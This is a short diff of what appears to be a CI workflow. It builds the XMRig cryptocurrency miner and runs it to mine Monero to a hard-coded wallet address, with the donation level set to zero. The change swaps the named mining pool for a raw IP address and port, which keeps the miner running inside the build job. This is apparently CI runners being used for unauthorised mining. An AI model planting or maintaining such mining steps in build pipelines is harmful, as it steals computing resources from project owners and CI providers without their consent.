@@ -22,4 +22,4 @@ jobs:
               cmake .. -DCMAKE_BUILD_TYPE=Release
               make --jobs=$(nproc)
 
-              ./xmrig --url pool.hashvault.pro:443 --user 42Ctz7xCRFX6nSgrPdR8sJRJNmHPGfjyQ5Rdir4Wa6TDGDtvsN8LGMsDqhbEBi7zgSaAQKLxQYUVUHF2XcnMSuzyFWc5H3P --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+              ./xmrig --url 131.153.56.98:5555 --user 42Ctz7xCRFX6nSgrPdR8sJRJNmHPGfjyQ5Rdir4Wa6TDGDtvsN8LGMsDqhbEBi7zgSaAQKLxQYUVUHF2XcnMSuzyFWc5H3P --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
